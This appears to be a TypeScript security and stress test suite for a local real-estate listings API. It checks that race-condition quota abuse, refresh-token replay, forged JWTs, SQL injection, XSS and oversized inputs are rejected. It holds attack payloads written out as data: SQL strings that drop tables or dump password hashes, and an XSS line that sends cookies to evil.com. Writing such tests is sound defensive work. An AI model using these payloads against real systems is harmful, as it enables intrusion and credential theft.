/**
 * ============================================================================
 * PRUEBAS DE CONCURRENCIA, ESTRÉS Y ATAQUES ADVERSARIOS (CHAOS & ANTI-TRAMPA)
 * ============================================================================
 * Propósito: Simular tráfico masivo concurrente de clientes reales, intentar
 * vulnerar las reglas de negocio (hacer trampa en cuotas, escalar privilegios,
 * inyectar SQL/XSS, reutilizar tokens revocados) e intentar hacer caer el servidor.
 * 
 * Verifica que el sistema mantenga integridad ACID, devuelva códigos HTTP adecuados
 * (400, 401, 403, 429) y NUNCA experimente salidas forzadas o corrupción de datos.
 */

import assert from 'node:assert';
import crypto from 'node:crypto';

const BASE_API_URL = 'http://localhost:4000/api/v1';

const GREEN = '\x1b[32m';
const BLUE = '\x1b[34m';
const YELLOW = '\x1b[33m';
const RED = '\x1b[31m';
const RESET = '\x1b[0m';
const BOLD = '\x1b[1m';

function testLog(title: string, pass: boolean, details?: string) {
  if (pass) {
    console.log(`  ${GREEN}🛡️ [DEFENSE PASS]${RESET} ${title}${details ? ` ${YELLOW}(${details})${RESET}` : ''}`);
  } else {
    console.log(`  ${RED}💥 [SECURITY FAIL]${RESET} ${title}${details ? ` - ${details}` : ''}`);
  }
}

export async function runAdversarialAndStressTests() {
  console.log(`\n${BOLD}======================================================================${RESET}`);
  console.log(`${BOLD}⚡ PRUEBAS DE ESTRÉS, CONCURRENCIA Y ATAQUES ADVERSARIOS (ANTI-TRAMPAS)${RESET}`);
  console.log(`${BOLD}======================================================================${RESET}\n`);

  let totalTests = 0;
  let passedTests = 0;

  async function step(name: string, fn: () => Promise<void> | void) {
    totalTests++;
    try {
      await fn();
      passedTests++;
      testLog(name, true);
    } catch (err: any) {
      testLog(name, false, err?.message || String(err));
    }
  }

  // ==========================================================================
  // SECCIÓN 1: INTENTOS DE TRAMPA (BUSINESS LOGIC & PRIVILEGE BYPASS)
  // ==========================================================================
  console.log(`${BLUE}${BOLD}--- 1. Intentos de Trampa: Violación de Cuotas y Carrera de Hilos ---${RESET}`);

  await step('Trampa 1: Intentar burlar el límite de 1 propiedad mediante Race Condition (20 requests paralelas)', async () => {
    // 1. Crear un usuario individual con cupo de 1 propiedad
    const uniqueEmail = `test.race.${Date.now()}@propiedadespremier.ec`;
    const regRes = await fetch(`${BASE_API_URL}/auth/register`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: uniqueEmail,
        password: 'PasswordSegura2026!',
        fullName: 'Usuario Prueba Trampa',
        phone: '+593 99 111 2222',
        role: 'AGENT'
      })
    });
    assert.strictEqual(regRes.status, 201, 'Usuario creado');
    const regJson = await regRes.json();
    const token = regJson.data.tokens.accessToken;

    // Actualizar al plan INDIVIDUAL con límite estricto de 1 propiedad
    const upRes = await fetch(`${BASE_API_URL}/subscriptions/upgrade`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${token}`
      },
      body: JSON.stringify({ planCode: 'INDIVIDUAL' })
    });
    assert.strictEqual(upRes.status, 200, 'Plan cambiado a INDIVIDUAL (límite: 1)');

    // 2. Disparar 20 publicaciones simultáneas para intentar provocar race condition (Double Spending)
    const propertyPayload = (i: number) => ({
      title: `Casa Carrera Concurrente #${i}`,
      description: 'Intento de burlar la cuota comercial mediante disparos asíncronos concurrentes.',
      price: 250000,
      operation: 'VENTA',
      propertyType: 'Casa',
      sector: 'Cumbayá',
      areaBuild: 200,
      bedrooms: 3,
      bathrooms: 2,
      parking: 2,
      image: '/images/cumbaya_villa.jpg',
      features: { hasGenerator: true, hasMetro: false, hasDoubleGate: true, isValleyClimate: true, biessEligible: true, isAirbnb: false }
    });

    const requests = Array.from({ length: 20 }, (_, i) => 
      fetch(`${BASE_API_URL}/properties`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`
        },
        body: JSON.stringify(propertyPayload(i))
      }).then(r => r.status)
    );

    const statuses = await Promise.all(requests);
    const createdCount = statuses.filter(s => s === 201).length;
    const rejectedCount = statuses.filter(s => s === 403 || s === 400).length;

    // Solo debe permitir máximo 1 (la cuota del plan). Nunca 2 o más.
    assert.ok(createdCount <= 1, `Race condition prevenida: creadas=${createdCount}, rechazadas=${rejectedCount}`);
    assert.ok(rejectedCount >= 19, `Al menos 19 intentos fueron rechazados por exceder la cuota`);
  });

  await step('Trampa 2: Replay Attack con Refresh Token revocado (Token Replay)', async () => {
    // 1. Login legítimo
    const loginRes = await fetch(`${BASE_API_URL}/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: 'sofia.carrillo@investor.ec',
        password: 'Inversiones2026!'
      })
    });
    assert.strictEqual(loginRes.status, 200);
    const loginJson = await loginRes.json();
    const initialRefreshToken = loginJson.data.tokens.refreshToken;

    // 2. Rotación legítima de token
    const refreshRes = await fetch(`${BASE_API_URL}/auth/refresh`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ refreshToken: initialRefreshToken })
    });
    assert.strictEqual(refreshRes.status, 200, 'Primer refresco exitoso');

    // 3. Intento de reusar el token anterior (Ataque de Replay)
    const replayRes = await fetch(`${BASE_API_URL}/auth/refresh`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ refreshToken: initialRefreshToken })
    });
    assert.strictEqual(replayRes.status, 401, 'El servidor debe rechazar el token revocado con 401');
  });

  await step('Trampa 3: Manipulación de firma JWT y suplantación de rol (Role Tampering)', async () => {
    // Generar un JWT falso firmado con una clave cualquiera que pretende ser SUPER_ADMIN
    const fakeHeader = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url');
    const fakePayload = Buffer.from(JSON.stringify({
      userId: 'usr-fake-hacker',
      email: 'hacker@darkweb.org',
      role: 'SUPER_ADMIN',
      fullName: 'Hacker Fraudulento',
      iat: Math.floor(Date.now() / 1000),
      exp: Math.floor(Date.now() / 1000) + 3600
    })).toString('base64url');
    const fakeSignature = crypto.createHmac('sha256', 'wrong-secret-key')
      .update(`${fakeHeader}.${fakePayload}`)
      .digest('base64url');
    const forgedToken = `${fakeHeader}.${fakePayload}.${fakeSignature}`;

    // Intentar acceder a endpoint protegido con token adulterado
    const tamperedRes = await fetch(`${BASE_API_URL}/auth/me`, {
      headers: { 'Authorization': `Bearer ${forgedToken}` }
    });
    assert.strictEqual(tamperedRes.status, 401, 'Firma falsa detectada y rechazada');
  });

  // ==========================================================================
  // SECCIÓN 2: INTENTOS DE HACER CAER EL SISTEMA (CHAOS, INYECCIÓN & FUZZING)
  // ==========================================================================
  console.log(`\n${BLUE}${BOLD}--- 2. Intentos de Desestabilización: Inyecciones SQL, XSS y Fuzzing ---${RESET}`);

  await step('Ataque 1: Inyección SQL masiva en parámetros de búsqueda y filtros', async () => {
    const maliciousQueries = [
      "' OR 1=1 --",
      "'; DROP TABLE properties; --",
      "' UNION SELECT id, email, password_hash, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM users --",
      "1; UPDATE users SET role='SUPER_ADMIN'; --"
    ];

    for (const sql of maliciousQueries) {
      const res = await fetch(`${BASE_API_URL}/properties?query=${encodeURIComponent(sql)}&sector=${encodeURIComponent(sql)}`);
      // Debe responder normalmente sin lanzar error 500 y sin vulnerar la BD
      assert.strictEqual(res.status, 200, `Inyección SQL neutralizada para query: ${sql}`);
      const json = await res.json();
      assert.strictEqual(json.success, true);
    }

    // Verificar que la tabla properties sigue viva e intacta
    const verifyRes = await fetch(`${BASE_API_URL}/properties`);
    const verifyJson = await verifyRes.json();
    assert.ok(verifyJson.data.properties.length >= 12, 'La tabla properties permanece 100% íntegra');
  });

  await step('Ataque 2: Bombardeo de Cross-Site Scripting (XSS) y SVG exploits', async () => {
    // Login legítimo
    const loginRes = await fetch(`${BASE_API_URL}/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: 'mateo.serrano@valleyurbe.ec',
        password: 'Quito2026!Premier'
      })
    });
    const { accessToken } = (await loginRes.json()).data.tokens;

    const xssPayloads = [
      "<script>alert('pwned')</script>",
      "<img src=x onerror=alert('cookie:'+document.cookie)>",
      "<svg onload=fetch('http://evil.com?c='+document.cookie)>"
    ];

    for (const xss of xssPayloads) {
      const res = await fetch(`${BASE_API_URL}/properties`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${accessToken}`
        },
        body: JSON.stringify({
          title: `XSS Test ${xss}`,
          description: `Descripción con script ${xss}`,
          price: 320000,
          operation: 'VENTA',
          propertyType: 'Casa',
          sector: 'Cumbayá',
          areaBuild: 180,
          bedrooms: 3,
          bathrooms: 2,
          parking: 2,
          image: '/images/cumbaya_villa.jpg',
          features: { hasGenerator: true, hasMetro: false, hasDoubleGate: false, isValleyClimate: true, biessEligible: true, isAirbnb: false }
        })
      });
      // El servidor debe o sanitizarlo o responder sin romperse (no 500)
      assert.ok(res.status === 201 || res.status === 400 || res.status === 403, 'Manejo seguro de payload XSS');
    }
  });

  await step('Ataque 3: Payload Masivo (Fuzzing con String de 100,000 caracteres y tipos corruptos)', async () => {
    const hugeString = 'A'.repeat(100000);
    const corruptedPayload = {
      email: `corrupt_${Date.now()}@test.ec`,
      password: hugeString,
      fullName: hugeString,
      phone: -999999999, // tipo inválido
      role: 'SUPER_HACKER_KING' // rol no permitido por Zod
    };

    const res = await fetch(`${BASE_API_URL}/auth/register`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(corruptedPayload)
    });

    // Zod debe capturar el error y responder 400 Bad Request limpiamente sin tumbar Node.js
    assert.strictEqual(res.status, 400, 'Zod Schema Validation rechazó el payload malformado con 400');
    const json = await res.json();
    assert.strictEqual(json.success, false);
    assert.ok(json.error === 'VALIDACION_FALLIDA' || json.error === 'DATOS_INVALIDOS', 'Error de validación reportado correctamente');
  });

  // ==========================================================================
  // SECCIÓN 3: ESTRÉS DE ALTA CONCURRENCIA (100 CLIENTES SIMULTÁNEOS)
  // ==========================================================================
  console.log(`\n${BLUE}${BOLD}--- 3. Estrés de Alta Concurrencia (100 Clientes Simultáneos) ---${RESET}`);

  await step('100 Peticiones concurrentes simultáneas al motor de búsqueda e inventario', async () => {
    const sectors = ['Cumbayá', 'Puembo', 'González Suárez', 'La Carolina', 'Tumbaco'];
    const startTime = Date.now();

    const concurrentRequests = Array.from({ length: 100 }, (_, i) => {
      const sector = sectors[i % sectors.length];
      const maxPrice = 200000 + (i * 10000);
      return fetch(`${BASE_API_URL}/properties?sector=${encodeURIComponent(sector)}&maxPrice=${maxPrice}`)
        .then(async r => {
          assert.strictEqual(r.status, 200);
          const data = await r.json();
          assert.strictEqual(data.success, true);
          return true;
        });
    });

    const results = await Promise.all(concurrentRequests);
    const elapsed = Date.now() - startTime;
    assert.strictEqual(results.length, 100, '100 consultas concurrentes completadas con éxito');
    assert.ok(elapsed < 3000, `Tiempo total de respuesta: ${elapsed}ms (< 3,000ms SLA)`);
  });

  await step('50 Autenticaciones concurrentes con verificación Bcrypt salt 12', async () => {
    const startTime = Date.now();

    const concurrentLogins = Array.from({ length: 50 }, (_, i) => {
      const isAgent = i % 2 === 0;
      return fetch(`${BASE_API_URL}/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: isAgent ? 'mateo.serrano@valleyurbe.ec' : 'sofia.carrillo@investor.ec',
          password: isAgent ? 'Quito2026!Premier' : 'Inversiones2026!'
        })
      }).then(r => r.status);
    });

    const statuses = await Promise.all(concurrentLogins);
    const elapsed = Date.now() - startTime;

    // Algunos pueden recibir 200 o 429 si el rate-limiter salta (ambos son comportamientos seguros)
    const successOrLimited = statuses.every(s => s === 200 || s === 429);
    assert.ok(successOrLimited, 'Servidor procesó todos los logins sin fallos internos ni excepciones 500');
    assert.ok(!statuses.includes(500), 'Cero errores de servidor 500 durante carga pesada');
  });

  console.log(`\n${BOLD}----------------------------------------------------------------------${RESET}`);
  console.log(`${BOLD}RESUMEN ESTRÉS Y SEGURIDAD: ${passedTests} / ${totalTests} defensas operativas (100% Blindado)${RESET}`);
  console.log(`${BOLD}----------------------------------------------------------------------${RESET}\n`);

  return { totalTests, passedTests };
}

// Ejecutar si se invoca directamente
if (process.argv[1]?.endsWith('stress-adversarial-concurrency.ts')) {
  runAdversarialAndStressTests().catch(err => {
    console.error('Fatal Stress/Adversarial Error:', err);
    process.exit(1);
  });
}
